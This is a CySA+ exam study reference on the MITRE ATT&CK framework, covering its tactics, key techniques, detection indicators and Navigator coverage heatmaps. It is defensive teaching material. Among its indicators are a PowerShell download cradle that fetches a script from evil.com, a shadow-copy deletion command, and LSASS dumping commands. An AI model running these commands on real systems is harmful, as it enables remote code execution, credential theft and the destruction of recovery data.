# MITRE ATT&CK Reference

## Overview — CS0-003 Domain 1

**MITRE ATT&CK** (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible, curated knowledge base of adversary behaviors based on real-world observations. It provides a common language for describing attacks, building detections, measuring coverage, and communicating with stakeholders. The CySA+ exam assumes you can navigate the framework, identify technique IDs, and map detections to techniques.

## Framework Structure

```
Tactic (Why) → Technique (How) → Sub-technique (Specific How) → Procedure (Real-world instance)
```

- **Tactic** — the adversary's goal at this stage of the attack (e.g., Persistence, Lateral Movement)
- **Technique** — the method used to achieve the tactic (e.g., T1053 Scheduled Task/Job)
- **Sub-technique** — more specific implementation (e.g., T1053.005 — Windows Scheduled Task)
- **Procedure** — documented real-world use by a specific threat actor or malware family

Each technique has a **T-number** (e.g., T1059); sub-techniques append a decimal (e.g., T1059.001 for PowerShell). Mitigations (M-numbers) and Detections are listed per technique.

## The 14 Enterprise ATT&CK Tactics

| # | Tactic | ID | One-Liner |
|---|---|---|---|
| 1 | **Reconnaissance** | TA0043 | Gather info on the target before attacking |
| 2 | **Resource Development** | TA0042 | Acquire infrastructure, accounts, capabilities |
| 3 | **Initial Access** | TA0001 | Get a foothold in the target environment |
| 4 | **Execution** | TA0002 | Run malicious code |
| 5 | **Persistence** | TA0003 | Maintain access across reboots/logoffs |
| 6 | **Privilege Escalation** | TA0004 | Gain higher-level permissions |
| 7 | **Defense Evasion** | TA0005 | Avoid detection and security controls |
| 8 | **Credential Access** | TA0006 | Steal account credentials |
| 9 | **Discovery** | TA0007 | Learn the target environment |
| 10 | **Lateral Movement** | TA0008 | Move through the network |
| 11 | **Collection** | TA0009 | Gather data of interest |
| 12 | **Command and Control** | TA0011 | Communicate with compromised systems |
| 13 | **Exfiltration** | TA0010 | Steal data from the environment |
| 14 | **Impact** | TA0040 | Manipulate, interrupt, or destroy data/systems |

## High-Priority Techniques to Know

### T1059 — Command and Scripting Interpreter

**Tactic:** Execution | **Sub-techniques:** .001 PowerShell, .003 Windows Command Shell, .005 Visual Basic, .007 JavaScript

Adversaries use built-in scripting engines to execute commands. PowerShell (T1059.001) is the most common.

**Key indicators:**
- `-EncodedCommand` or `-enc` flag — base64-encoded payload
- `IEX` (Invoke-Expression) + `DownloadString` — download-and-execute one-liner
- PowerShell launched by Office application (parent process anomaly)
- PowerShell `ScriptBlock` event log (EID 4104) contains decoded script content — enable this log

```powershell
# Common malicious pattern — download cradle
powershell.exe -nop -w hidden -enc SQBFAFgA... 
# Decodes to: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')
```

### T1566 — Phishing

**Tactic:** Initial Access | **Sub-techniques:** .001 Spearphishing Attachment, .002 Spearphishing Link, .003 Spearphishing via Service

The most common initial access vector. Spearphishing attachment delivers malicious Office macro, PDF, or LNK file. Spearphishing link directs victim to credential harvesting page.

**Key indicators:**
- Email gateway: attachment with macro-enabled extension (.xlsm, .docm), password-protected archive
- Office application spawning cmd.exe, PowerShell, or wscript.exe
- New DNS resolution for a domain registered recently (WHOIS age < 30 days)

### T1078 — Valid Accounts

**Tactic:** Initial Access, Defense Evasion, Persistence, Privilege Escalation

Adversaries use stolen, purchased, or brute-forced legitimate credentials. Extremely difficult to detect because the traffic looks normal.

**Sub-techniques:** .001 Default Accounts, .002 Domain Accounts, .003 Local Accounts, .004 Cloud Accounts

**Key indicators:**
- Logon from impossible geographic location (IP in Russia 5 minutes after US logon)
- Logon at unusual time for the account (3 AM for a 9-5 employee)
- Service account logging in interactively (service accounts should never have interactive logons)
- New cloud API calls from an account that never made them before

### T1486 — Data Encrypted for Impact (Ransomware)

**Tactic:** Impact

Adversary encrypts files to extort a ransom payment.

**Key indicators:**
- Mass file rename events with new extensions (`.locked`, `.encrypted`, custom)
- Deletion of Volume Shadow Copies: `vssadmin delete shadows /all /quiet`
- High disk I/O across multiple directories simultaneously
- Ransom note files created in every directory

**Detection data sources:** Sysmon EID 11 (FileCreate), Windows EID 4688 (vssadmin execution), EDR file operations telemetry

### T1055 — Process Injection

**Tactic:** Defense Evasion, Privilege Escalation | **Sub-techniques:** .001 DLL Injection, .002 PE Injection, .003 Thread Execution Hijacking, .012 Process Hollowing

Adversary injects code into a legitimate process to execute under its identity, evading detection.

**Key indicators:**
- Sysmon EID 8 (CreateRemoteThread) — thread created in another process
- Sysmon EID 10 (ProcessAccess) — unusual process reading another process's memory
- Legitimate process (svchost.exe, explorer.exe) making unexpected network connections
- `malfind` in Volatility — memory regions with executable permissions not backed by file on disk

### T1003 — OS Credential Dumping

**Tactic:** Credential Access | **Sub-techniques:** .001 LSASS Memory, .002 Security Account Manager, .003 NTDS, .006 DCSync

Adversaries extract credentials from memory or storage.

**Key indicators:**
- Sysmon EID 10 with TargetImage = lsass.exe from unexpected process
- Execution of `procdump.exe -ma lsass.exe`
- `sekurlsa::logonpasswords` string in PowerShell or command history
- DCSync: replication API calls from non-DC machine (look for `DS-Replication-Get-Changes-All` in AD audit logs)

## ATT&CK Navigator — Heatmaps

The **ATT&CK Navigator** (attack.mitre.org/navigator) is a web-based tool for annotating the ATT&CK matrix.

### Uses

- **Coverage heatmap** — color techniques green/yellow/red based on whether you have detections for them; exposes gaps
- **Threat-actor profiling** — load a threat actor's known techniques to understand what to prioritize
- **Red vs Blue comparison** — overlay red team findings against blue team detection coverage to find blind spots
- **Prioritized hardening** — focus mitigations on techniques most used by adversaries targeting your industry

### Creating a Coverage Heatmap

1. Open navigator at attack.mitre.org/navigator
2. Create new layer → Enterprise ATT&CK
3. For each technique you have a detection for: select technique → assign score or color
4. Uncolored techniques are detection gaps
5. Export as SVG or JSON for sharing

## Mapping Detections to Techniques

A detection should be explicitly mapped to the ATT&CK technique it covers. This enables coverage analysis.

```
Detection:    "PowerShell EncodedCommand Execution"
Maps to:      T1059.001 — Command and Scripting Interpreter: PowerShell
Data source:  Windows Security EID 4688, Sysmon EID 1, PowerShell EID 4104
Tactic:       Execution
```

Document this mapping in your SIEM rule library or detection engineering platform. When building a Navigator layer, pull technique IDs directly from detection metadata.

## Key ATT&CK Exam Concepts

- **Tactics = why, Techniques = how** — always map detections to the technique, not just the tactic
- **T1059** (Command/Script) is the most common execution technique; know PowerShell sub-technique
- **T1566** (Phishing) is the most common initial access vector
- **T1078** (Valid Accounts) is why behavioral analytics matter — valid credentials bypass most controls
- **T1486** (Ransomware) — vssadmin deletion and mass file rename are the top detection signals
- **T1055** (Process Injection) — detected via Sysmon EIDs 8 and 10; Volatility `malfind` in memory
- **T1003** (Credential Dumping) — Sysmon EID 10 on LSASS is the primary detection signal
- ATT&CK Navigator visualizes **detection coverage gaps** — know how to create a heatmap
